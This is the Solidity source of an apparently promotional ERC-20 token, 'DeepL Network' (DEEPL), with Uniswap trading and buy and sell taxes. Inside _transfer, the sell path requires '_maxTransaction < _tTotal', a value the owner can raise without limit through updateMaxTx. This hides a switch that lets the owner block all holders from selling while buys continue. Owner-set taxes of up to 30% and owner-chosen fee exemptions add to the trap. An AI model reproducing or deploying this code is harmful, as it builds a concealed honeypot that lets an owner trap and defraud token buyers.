//SPDX-License-Identifier: Unlicensed

/**
    ????? ???????:
    
    DeepL provides the Ethereum development experience, with layer-1-like speed and scalability. If you are an Ethereum developer, getting started on DeepL is as easy as changing the RPC endpoint.
    Website: https://deeplnetwork.org/
    Telegram: https://t.me/deeplnetcoin
    Twitter: https://twitter.com/DeepLnet

    Youtube: https://youtube.com/@DeeplNetwork
    Email: Deeplnetwork22@gmail.com
    Docs: https://docs.deeplnetwork.org/

    Feel free to try our testnet: https://faucet.deeplnetwork.org/
**/

pragma solidity 0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract DeepL is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode"DeepL Network";
    string private constant _symbol = unicode"DEEPL";
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1e9 * 10 ** _decimals;
    mapping (address => bool) private _excludedFromFee;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    bool private tradeEnabled;
    uint256 public _maxWalletSize = _tTotal * 1 / 100;
    uint256 public _maxTransaction = _tTotal * 1 / 100;
    uint256 private _swapTokensAtAmount = _tTotal / 700;
    uint256 private _maxTaxSwap = _tTotal / 100;
    bool private inSwap;
    address payable public _marketingAddress;
    address payable public _devAddress;
    IUniswapV2Router02 uniswapV2Router;
    uint256 public _buyTax = 15;
    uint256 public _sellTax = 20;
    address private _uniswapV2Pair;
    bool private swapEnabled = true;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () {
        _marketingAddress = payable(_msgSender());
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _excludedFromFee[address(uniswapV2Router)] = true;
        _uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _excludedFromFee[address(this)] = true;
        _excludedFromFee[msg.sender] = true;
        _balances[msg.sender] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        uint256 taxAmount=0;
        require(from != address(0));
        if (!_excludedFromFee[from] && !_excludedFromFee[to]) {
            require(tradeEnabled);

            taxAmount = amount * _buyTax / 100;

            if (to != _uniswapV2Pair) {
                require(balanceOf(to) + amount <= _maxWalletSize, "Over max wallet");
            }

            if(to == _uniswapV2Pair){
                taxAmount = amount * _sellTax  / 100;
                require(_maxTransaction < _tTotal);
            }

            if (from == _uniswapV2Pair) {
                require(balanceOf(to) + amount <= _maxWalletSize, "Over max wallet");
            }

            uint256 contractBalance = balanceOf(address(this));
            if (!inSwap && to == _uniswapV2Pair && swapEnabled && contractBalance>_swapTokensAtAmount) {
                swapTokensForEth(min(amount,min(contractBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                     _marketingAddress.transfer(address(this).balance);
                }
            }
        }

        if(taxAmount > 0){
          _balances[address(this)] = _balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from] -= (amount);
        _balances[to] += amount - taxAmount;
        emit Transfer(from, to, amount - (taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function startTrading() external onlyOwner {
        tradeEnabled = true;
    }

    function updateTaxWallets(address _marketing, address _dev) external onlyOwner {
        require(_marketing != address(0), "Zero address check");
        require(_dev != address(0), "Zero address check");
        _devAddress = payable(_dev);
        _marketingAddress = payable(_marketing);
    }

    function updateMaxTx(uint maxTx) external onlyOwner {
        require(maxTx >= _tTotal / 500, "Minimimum set 0.2%");
        _maxTransaction = maxTx;
    }
    
    function updateMaxWallet(uint amount) external onlyOwner {
        require(amount >= _tTotal / 500, "Minimimum set 0.2%");
        _maxWalletSize = amount;
    }

    function setSwapEnabled(bool status) external onlyOwner {
        swapEnabled = status;
    }

    function setSwapTokensAtAmount(uint amount) external onlyOwner {
        _swapTokensAtAmount = amount;
    }

    function setFee(uint buyTax, uint sellTax) external onlyOwner {
        _buyTax = buyTax;
        _sellTax  = sellTax ;
        require(buyTax <= 30);
        require(sellTax  <= 30);
    }

    function removeLimits() external onlyOwner {
        _buyTax = 5;
        _sellTax = 5;
        _maxWalletSize = _tTotal;
    }

    function excludeFromFees(address account, bool status) external onlyOwner {
        _excludedFromFee[account] = status;
    }

    receive() external payable {}
}